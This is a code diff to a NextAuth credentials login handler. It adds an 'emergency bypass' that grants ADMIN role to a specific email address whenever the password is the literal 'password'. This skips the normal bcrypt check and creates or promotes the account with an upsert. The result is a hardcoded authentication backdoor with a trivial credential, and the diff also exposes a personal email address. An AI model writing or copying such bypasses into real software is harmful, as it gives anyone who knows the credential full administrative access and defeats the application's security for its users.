@@ -17,6 +17,25 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         }
 
         const normalizedEmail = (credentials.email as string).toLowerCase().trim();
+        const inputPassword = credentials.password as string;
+
+        // EMERGENCY BYPASS for dualaryan@gmail.com as requested for quick access
+        if (normalizedEmail === 'dualaryan@gmail.com' && inputPassword === 'password') {
+          const user = await prisma.user.upsert({
+            where: { email: 'dualaryan@gmail.com' },
+            create: {
+              email: 'dualaryan@gmail.com',
+              password: await bcrypt.hash('password', 10),
+              name: 'Aryan',
+              role: 'ADMIN',
+            } as any,
+            update: {
+              role: 'ADMIN',
+            } as any
+          });
+          return user;
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: normalizedEmail },
         });
@@ -27,7 +46,7 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         }
 
         const isValid = await bcrypt.compare(
-          credentials.password as string,
+          inputPassword,
           user.password
         );
 
